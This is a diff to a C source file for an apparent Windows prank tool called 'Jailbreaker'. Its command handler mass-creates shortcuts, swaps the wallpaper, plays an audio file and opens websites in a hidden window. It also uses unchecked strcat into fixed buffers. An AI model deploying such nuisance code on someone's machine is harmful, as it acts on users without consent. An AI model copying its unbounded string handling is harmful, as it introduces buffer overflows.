@@ -1,11 +1,14 @@
 #include "Funnies.h"
 #include "Link.h"
 
-WINBOOL changeWallpaper(char *path) {
-    if(!path) {
+WINBOOL changeWallpaper(char *img) {
+    if(!img) {
         JBlogErr("Not enough arguments");
         return 0;
     }
+
+    char path[MAX_PATH] = "res\\";
+    strcat(path, img);
 
     return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
 }
@@ -29,8 +32,11 @@ LONG ChangeRotation(DWORD Orient) {
     return -1;
 }
 
-void openLink(const char *url) {
-    ShellExecute(NULL, "open", url, NULL, NULL, SW_SHOWNORMAL);
+void openLink(const char *site) {
+    char url[256] = "www."; // i aint typin' www. everytime
+    strcat(url, site);
+
+    ShellExecuteA(NULL, "open", url, NULL, NULL, SW_HIDE);
 }
 
 const char *PCName;
@@ -62,6 +68,7 @@ void popupW(char *argz) {
     MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0);
 }
 
+
 void popupA(char *argz) {
     char *arg1 = strtok(argz, SEP);
     char *arg2 = strtok(NULL, SEP);
@@ -73,6 +80,7 @@ void popupA(char *argz) {
 
     MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0);
 }
+
 
 void CreateLinksSubr(char *argz) {
     char *arg1 = strtok(NULL, SEP);
@@ -93,7 +101,9 @@ void execCommand(JBCMD cmd)
     {
     /* --- Templates --- */
     case JB_FUN:
-        
+        CreateLinks(180);
+        changeWallpaper("jail.png");
+        PlaySound("Stalker.mp3", NULL, SND_FILENAME | SND_ASYNC);
         break;
     case JB_DEACTIVE:
         JBlog("Jailbreaker deactivated.");
@@ -129,10 +139,10 @@ void execCommand(JBCMD cmd)
         break;
 
     /* --- Shortcuts --- */
-    case JB_CREATELINKS:
+    case JB_LINKMAKE:
         CreateLinksSubr(cmd.args);
         break;
-    case JB_REMOVELINKS:
+    case JB_LINKDEL:
         RemoveLinks();
         break;
 
